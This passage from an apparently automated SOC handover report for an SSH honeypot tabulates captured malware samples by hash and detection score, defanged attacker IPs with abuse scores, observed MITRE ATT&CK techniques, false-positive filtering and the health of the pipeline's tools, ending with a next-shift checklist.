| `66.132.195[.]34` | 1 | 2026-05-30 04:39 | 2026-05-30 04:39 | 18s | 0 | `T1592` | 🟢 LOW |
| `79.36.191[.]212` | 1 | 2026-05-30 04:55 | 2026-05-30 04:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `194.102.73[.]93` | RO | Universitatea de Stiinte Agricole si Medicina Veterinara Cluj-Napoca | **100** ⚠️ | 0 |
| `136.34.134[.]182` | US | Google Fiber Inc. | **100** ⚠️ | 6 |
| `120.27.154[.]152` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `43.138.40[.]107` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 19 |
| `219.134.115[.]133` | CN | CHINANET Guangdong province network | **100** ⚠️ | 4 |
| `37.143.61[.]4` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 15 |
| `121.196.157[.]119` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 19 |
| `66.132.195[.]34` | US | Censys, Inc. | **100** ⚠️ | 47 |
| `101.35.248[.]174` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 121 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 66 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 51 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 206 cases |
| Tool 34  | Credential Extractor        | ✅ 118 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 45 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 51 priority case(s) shown individually · 39 recon entry/entries in table (18 group(s) consolidating 127 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-30T06:50:21Z_
